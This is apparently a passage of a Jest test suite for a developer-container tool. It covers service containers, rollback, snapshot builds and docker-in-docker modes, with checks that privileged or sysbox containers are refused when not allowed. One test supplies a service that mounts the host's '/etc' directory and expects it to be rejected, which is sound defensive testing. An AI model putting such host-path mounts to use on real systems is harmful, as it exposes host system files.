    expect(m.indexOf('createNetwork')).toBeLessThan(m.indexOf('run'));
    // The health check ran before the branch container existed
    const calls = b.calls.map(c => (c.method === 'exec' ? `exec ${(c.args[1] as string[]).join(' ')}` : c.method));
    expect(calls.indexOf('exec sh -c pg_isready')).toBeLessThan(calls.lastIndexOf('run') - 1);
    expect(result.services).toEqual(['postgres']);
  });

  it('a start without services has no services key and lists none', async () => {
    const b = backend();
    const result = await startContainer(b, options());
    expect(result.services).toBeUndefined();
    expect(b.methods()).not.toContain('composeConfig');
  });

  it('an invalid service definition fails the start before anything is created', async () => {
    const b = backend();
    const bad = options({ config: { container: { services: { pg: { image: 'p', volumes: { '/etc': '/x' } } } } } as unknown as KunjConfig });
    await expect(startContainer(b, bad)).rejects.toMatchObject({ code: 'setup', message: expect.stringMatching(/host paths are not allowed/) });
    expect(b.methods()).not.toContain('createNetwork');
  });

  it('rollback removes the service containers and volumes this run created', async () => {
    const b = backend();
    const real = b.exec.bind(b);
    b.exec = async (id: string, cmd: string[], io?: ExecIO) => {
      const r = await real(id, cmd, io);
      return cmd[0] === 'sh' && cmd[1] === '-c' && cmd[2].startsWith('set -e') ? { exitCode: 1, stdout: '' } : r;
    };
    await expect(startContainer(b, svcOptions())).rejects.toMatchObject({ code: 'seed' });
    expect(b.callsOf('remove')).toEqual([[{
      containers: [names.helper, names.container, PG],
      volumes: [names.workspaceVolume, names.homeVolume, PG_DATA],
      networks: [names.network],
    }]]);
  });

  it('rollback when a service fails to run removes what was created so far', async () => {
    const b = backend();
    b.failOn = 'run';
    await expect(startContainer(b, svcOptions())).rejects.toMatchObject({ code: 'docker' });
    expect(b.callsOf('remove')).toEqual([[{
      containers: [PG],
      volumes: [names.workspaceVolume, names.homeVolume, PG_DATA],
      networks: [names.network],
    }]]);
  });

  it('resume starts stopped services before the branch container', async () => {
    const b = backend();
    b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    b.existing = [info({ state: 'exited' }), svcInfo('exited')];
    const result = await startContainer(b, svcOptions());
    expect(b.callsOf('start')).toEqual([['pg-id'], ['main-id']]);
    expect(execCmds(b)[0]).toBe('sh -c pg_isready');
    expect(result.services).toEqual(['postgres']);

    // A running branch container with a stopped service: only the service is started
    const running = backend();
    running.existing = [
      info({}),
      info({ id: 'helper-id', name: names.helper, labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'helper' }) }),
      svcInfo('exited'),
    ];
    await startContainer(running, svcOptions());
    expect(running.callsOf('start')).toEqual([['pg-id']]);
  });

  it('stop stops the services after the branch container', async () => {
    const b = new FakeBackend();
    b.existing = [info({}), svcInfo('running')];
    await stopContainer(b, names);
    expect(b.callsOf('stop')).toEqual([[names.helper], [names.container], ['pg-id']]);
  });

  it('remove deletes the service containers and their volumes (kept with --keep-volumes)', async () => {
    const b = new FakeBackend();
    b.existing = [info({}), svcInfo('running')];
    await removeContainer(b, names, { force: true, keepVolumes: false, user: 'dev', kunjVersion: VERSION });
    expect(b.callsOf('remove')).toEqual([[{
      containers: [names.helper, names.container, PG],
      volumes: [names.workspaceVolume, names.homeVolume, names.dockerVolume, PG_DATA],
      networks: [names.network],
    }]]);

    const kept = new FakeBackend();
    kept.existing = [info({}), svcInfo('running')];
    await removeContainer(kept, names, { force: true, keepVolumes: true, user: 'dev', kunjVersion: VERSION });
    expect(kept.callsOf('remove')[0][0]).toEqual({ containers: [names.helper, names.container, PG], volumes: [], networks: [names.network] });
  });

  it("imports the devcontainer's compose services, without its own service", async () => {
    const git = (...args: string[]) => execFileSync('git', args, { cwd: tmp, env: GIT_ENV });
    git('init', '-q');
    fs.mkdirSync(path.join(tmp, '.devcontainer'));
    fs.writeFileSync(path.join(tmp, '.devcontainer', 'devcontainer.json'), JSON.stringify({ dockerComposeFile: 'compose.yml', service: 'dev', remoteUser: 'node' }));
    fs.writeFileSync(path.join(tmp, '.devcontainer', 'compose.yml'), 'services: {}\n');
    git('add', '.');
    git('commit', '-qm', 'dc');
    git('update-ref', `refs/remotes/origin/${BRANCH}`, 'HEAD');

    const b = backend();
    b.composeConfigs.set('services: {}\n', { services: { dev: { image: 'node:22' }, redis: { image: 'redis:7', ports: [{ target: 6379, published: '6379' }] } } });
    const warnings: string[] = [];
    await startContainer(b, options({ warn: m => warnings.push(m) }));
    expect(runSpecs(b).map(s => s.name)).toEqual([`${names.container}-svc-redis`, names.container, names.helper]);
    expect(warnings).toContain('.devcontainer/compose.yml: ignoring redis.ports (published)');
    expect(warnings.some(w => /dockerComposeFile is not supported/.test(w))).toBe(false);
  });
});

describe('services in a snapshot build', () => {
  it('start the blueprint services under the snapshot names before setup runs', async () => {
    const text = JSON.stringify({ setup: ['npm run migrate'], services: { postgres: { image: 'postgres:16-alpine', healthcheck: 'pg_isready' } } });
    const blueprint: ResolvedBlueprint = { blueprint: parseBlueprint(text, 'bp'), source: 'host', path: 'bp', text };
    const b = backend();
    await startContainer(b, options({ blueprint, presets: [], namesFor: 'main:snapshot', noSnapshot: true }));
    const snapNames = containerNames(REPO.name, REPO.id, 'main:snapshot');
    const svcRun = b.callsOf('run').map(a => a[0] as ContainerSpec).find(s => s.name === `${snapNames.container}-svc-postgres`);
    expect(svcRun?.labels[LABEL.branch]).toBe('main:snapshot');
    expect(svcRun?.network).toBe(snapNames.network);
    const calls = b.calls.map(c => (c.method === 'exec' ? (c.args[1] as string[]).join(' ') : c.method));
    expect(calls.indexOf('sh -c pg_isready')).toBeGreaterThan(-1);
    expect(calls.indexOf('sh -c pg_isready')).toBeLessThan(calls.indexOf('sh -lc npm run migrate'));
  }, 30_000);
});

describe('docker in docker', () => {
  const DIND_START = '/usr/local/bin/kunj-dind-start';

  function dindBackend(runtimes = ['runc', 'sysbox-runc']): FakeBackend {
    const b = backend();
    b.existingImages.add(DIND_IMAGE(VERSION));
    b.infoResult = { serverVersion: '27', runtimes, operatingSystem: 'Ubuntu 24.04 LTS' };
    return b;
  }

  function dindOptions(mode: string, over: Partial<StartOptions> = {}, container: Record<string, unknown> = {}): StartOptions & { warnings: string[] } {
    const warnings: string[] = [];
    const config = { container: { dockerInDocker: mode, ...container } } as unknown as KunjConfig;
    return { ...options({ config, warn: m => warnings.push(m), ...over }), warnings };
  }

  it('sysbox: the sysbox runtime, capabilities kept, a docker volume, KUNJ_DIND and the DinD image', async () => {
    const b = dindBackend();
    const result = await startContainer(b, dindOptions('sysbox'));
    expect(result.dind).toBe('sysbox');
    const [main] = runSpecs(b);
    expect(main.image).toBe(DIND_IMAGE(VERSION));
    expect(main.runtime).toBe('sysbox-runc');
    expect(main.privileged).toBeUndefined();
    expect(main.capDrop).toBeUndefined();
    expect(main.capabilities).toBeUndefined();
    expect(main.volumes).toContainEqual({ name: names.dockerVolume, path: '/var/lib/docker' });
    expect(main.env.KUNJ_DIND).toBe('sysbox');
    expect(JSON.parse(main.labels[LABEL.options]).dind).toBe('sysbox');
    // Labelled like the other volumes, so list and prune see it
    expect(b.volumeLabels.get(names.dockerVolume)).toEqual(b.volumeLabels.get(names.workspaceVolume));
  });

  it('privileged: --privileged with allowPrivileged', async () => {
    const b = dindBackend(['runc']);
    await startContainer(b, dindOptions('privileged', {}, { allowPrivileged: true }));
    const [main] = runSpecs(b);
    expect(main.privileged).toBe(true);
    expect(main.runtime).toBeUndefined();
    expect(main.capDrop).toBeUndefined();
    expect(main.env.KUNJ_DIND).toBe('privileged');
  });

  it('off: caps dropped, no docker volume, no KUNJ_DIND, no dind label', async () => {
    const b = dindBackend();
    await startContainer(b, dindOptions('off'));
    const [main] = runSpecs(b);
    expect(main.capDrop).toEqual(['ALL']);
    expect(main.volumes.map(v => v.name)).not.toContain(names.dockerVolume);
    expect(main.env.KUNJ_DIND).toBeUndefined();
    expect(JSON.parse(main.labels[LABEL.options]).dind).toBeUndefined();
    expect(execCmds(b)).not.toContain(DIND_START);
  });

  it('refuses before anything is created', async () => {
    for (const [mode, container, info] of [
      ['sysbox', {}, { runtimes: ['runc'], operatingSystem: 'Ubuntu' }],
      ['privileged', {}, { runtimes: ['runc'], operatingSystem: 'Ubuntu' }],
      ['privileged', { allowPrivileged: true }, { runtimes: ['runc'], operatingSystem: 'Docker Desktop' }],
    ] as const) {
      const b = dindBackend();
      b.infoResult = { serverVersion: '27', ...info, runtimes: [...info.runtimes] };
      await expect(startContainer(b, dindOptions(mode, {}, container))).rejects.toMatchObject({ code: 'dind' });
      expect(b.methods().filter(m => ['createNetwork', 'createVolume', 'run', 'buildImage'].includes(m))).toEqual([]);
      expect(mocked.pushBranch).not.toHaveBeenCalled();
    }
  });

  it('refuses a custom or devcontainer image: DinD needs the kunj image', async () => {
    const b = dindBackend();
    b.existingImages.add('custom:1');
    await expect(startContainer(b, dindOptions('sysbox', { imageOverride: 'custom:1' }))).rejects.toThrow(/kunj sandbox image/);
    expect(b.methods()).not.toContain('run');
  });

  it('starts dockerd as root only after the helper is ready, before the seed', async () => {
    const b = dindBackend();
    await startContainer(b, dindOptions('sysbox'));
    const execs = b.callsOf('exec');
    const cmds = execs.map(a => (a[1] as string[]).join(' '));
    const at = cmds.indexOf(DIND_START);
    expect(at).toBeGreaterThan(cmds.indexOf(READY));
    expect(at).toBeLessThan(cmds.findIndex(c => c.startsWith('sh -c set -e')));
    expect(execs[at][0]).toBe('id-1');
    expect((execs[at][2] as ExecIO).user).toBe('root');
  });

  it('warns and carries on when dockerd does not come up', async () => {
    const b = dindBackend();
    b.execResults.set(DIND_START, { exitCode: 1, stdout: '' });
    const opts = dindOptions('sysbox');
    const result = await startContainer(b, opts);
    expect(result.created).toBe(true);
    expect(opts.warnings.some(w => /Docker inside the container did not start/.test(w))).toBe(true);
  });

  it('builds the sandbox image before the DinD image built on it', async () => {
    const b = dindBackend();
    b.existingImages.delete(DIND_IMAGE(VERSION));
    b.existingImages.delete(SANDBOX_IMAGE(VERSION));
    await startContainer(b, dindOptions('sysbox'));
    const builds = b.callsOf('buildImage');
    expect(builds.map(a => a[0])).toEqual([SANDBOX_IMAGE(VERSION), DIND_IMAGE(VERSION)]);
    expect((builds[1][1] as { buildArgs: Record<string, string> }).buildArgs).toEqual({ BASE_IMAGE: SANDBOX_IMAGE(VERSION) });
  });

  it('adds the registries to the allowlist only in allowlist mode', async () => {
    const allow = dindBackend();
    await startContainer(allow, dindOptions('sysbox', {}, { network: { allow: ['example.org'] } }));
    const domains = runSpecs(allow)[1].env.KUNJ_FW_DOMAINS.split(' ');
    expect(domains).toEqual(['example.org', ...DIND_DOMAINS]);

    const open = dindBackend();
    await startContainer(open, dindOptions('sysbox'));
    expect(runSpecs(open)[1].env.KUNJ_FW_DOMAINS).toBe('');
  });

  it('resume starts dockerd again after the helper is ready', async () => {
    const b = dindBackend();
    b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    b.existing = [info({ state: 'exited', labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'main', [LABEL.options]: JSON.stringify({ user: 'dev', dind: 'sysbox' }) }) })];
    await startContainer(b, dindOptions('sysbox'));
    const cmds = execCmds(b);
    expect(cmds.indexOf(DIND_START)).toBeGreaterThan(cmds.indexOf(READY));
    expect(b.callsOf('exec').find(a => (a[1] as string[]).join(' ') === DIND_START)?.[2]).toMatchObject({ user: 'root' });
  });

  function stoppedWith(b: FakeBackend, dind: string): void {
    b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    b.existing = [info({ state: 'exited', labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'main', [LABEL.options]: JSON.stringify({ user: 'dev', dind }) }) })];
  }

  it('resume refuses a privileged container once allowPrivileged is no longer true', async () => {
    for (const [mode, container] of [['privileged', {}], ['off', {}], ['privileged', { allowPrivileged: false }]] as const) {
      const b = dindBackend(['runc']);
      stoppedWith(b, 'privileged');
      await expect(startContainer(b, dindOptions(mode, {}, container))).rejects.toMatchObject({
        code: 'dind',
        message: expect.stringMatching(/allowPrivileged.*kunj ct remove/s),
      });
      expect(b.callsOf('start')).toEqual([]);
      expect(execCmds(b)).toEqual([]);
    }
    // Still allowed: it resumes, privileged, with dockerd
    const ok = dindBackend(['runc']);
    stoppedWith(ok, 'privileged');
    await startContainer(ok, dindOptions('privileged', {}, { allowPrivileged: true }));
    expect(ok.callsOf('start')).toEqual([['main-id']]);
    expect(execCmds(ok)).toContain(DIND_START);
  });

  it('resume refuses a sysbox container when the daemon no longer has the sysbox runtime', async () => {
    const b = dindBackend(['runc']);
    stoppedWith(b, 'sysbox');
    await expect(startContainer(b, dindOptions('sysbox'))).rejects.toMatchObject({ code: 'dind', message: expect.stringMatching(/sysbox-runc/) });
    expect(b.callsOf('start')).toEqual([]);
  });

  it('a snapshot build (withoutDind) uses the DinD image but never runs dockerd or creates the docker volume', async () => {
    const b = dindBackend();
    await startContainer(b, dindOptions('sysbox', { withoutDind: true }));
    const [main] = runSpecs(b);
    expect(main.image).toBe(DIND_IMAGE(VERSION));
    expect(main.runtime).toBeUndefined();
    expect(main.capDrop).toEqual(['ALL']);
    expect(main.volumes.map(v => v.name)).not.toContain(names.dockerVolume);
    expect(execCmds(b)).not.toContain(DIND_START);
  });

  it('with a compose file and DinD off, suggests services once', async () => {
    fs.writeFileSync(path.join(tmp, 'compose.yaml'), 'services: {}\n');
    const off = dindOptions('off');
    await startContainer(dindBackend(), off);
    expect(off.warnings.filter(w => w.includes('compose file'))).toHaveLength(1);
    expect(off.warnings.find(w => w.includes('compose file'))).toContain('container.services');

    const on = dindOptions('sysbox');
    await startContainer(dindBackend(), on);
    expect(on.warnings.some(w => w.includes('compose file'))).toBe(false);
  });

  it('remove deletes the docker volume with the others', async () => {
    const b = new FakeBackend();
    b.existing = [info({})];
    await removeContainer(b, names, { force: true, keepVolumes: false, user: 'dev', kunjVersion: VERSION });
    expect((b.callsOf('remove')[0][0] as { volumes: string[] }).volumes).toContain(names.dockerVolume);
  });
});
